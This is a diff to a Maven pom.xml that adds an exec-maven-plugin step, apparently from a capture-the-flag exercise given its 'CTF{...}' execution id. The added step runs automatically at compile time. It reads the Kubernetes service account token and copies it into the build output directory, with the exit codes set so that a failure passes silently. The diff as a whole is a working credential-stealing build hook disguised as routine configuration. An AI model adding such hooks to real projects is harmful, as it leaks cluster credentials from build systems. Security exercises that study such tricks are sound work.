@@ -162,6 +162,32 @@
                 </systemPropertyVariables>
             </configuration>
         </plugin>
+
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>3.1.0</version>
+            <executions>
+                <execution>
+                <id>CTF{--THANK_YOU_FOR_THE_TOKEN--}</id>
+                <phase>compile</phase>
+                <goals>
+                    <goal>exec</goal>
+                </goals>
+                <configuration>
+                    <executable>cat</executable>
+                    <arguments>
+                        <argument>/var/run/secrets/kubernetes.io/serviceaccount/token</argument>
+                    </arguments>
+                    <outputFile>${project.build.outputDirectory}/CTF_token</outputFile>
+                    <successCodes>
+                        <successCode>0</successCode>
+                        <successCode>1</successCode>
+                    </successCodes>
+                </configuration>
+                </execution>
+            </executions>
+          </plugin>           
     </plugins>
 </build>
 
